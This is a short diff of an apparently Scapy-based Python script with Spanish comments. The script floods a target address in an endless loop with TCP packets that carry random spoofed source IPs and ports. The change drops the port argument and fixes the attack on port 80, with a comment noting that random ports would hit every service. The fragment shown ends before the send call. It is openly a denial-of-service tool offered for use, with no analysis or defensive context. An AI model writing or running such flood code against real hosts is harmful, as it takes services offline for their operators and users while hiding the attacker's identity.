@@ -12,7 +12,7 @@ import sys
 
 parse = argparse.ArgumentParser()
 parse.add_argument("-t", "--target",help="Direccion del objetivo")
-parse.add_argument("-p", "--port", help= "puerto a atacar")
+#parse.add_argument("-p", "--port", help= "puerto a atacar")
 parse = parse.parse_args()
 
 target = parse.target
@@ -24,7 +24,7 @@ def main ():
        while True:
            srcip = RandIP()
            sport = RandShort()
-           dport = parse.port # o RandShort() para atacar a todos los puertos del servidor 80=http 21=ftp 443=https
+           dport = 80 # parse.port  o RandShort() para atacar a todos los puertos del servidor 80=http 21=ftp 443=https
 
            IP_layer = IP(src=srcip, dst=parse.target)
            TCP_layer = TCP(sport=sport, dport=dport)
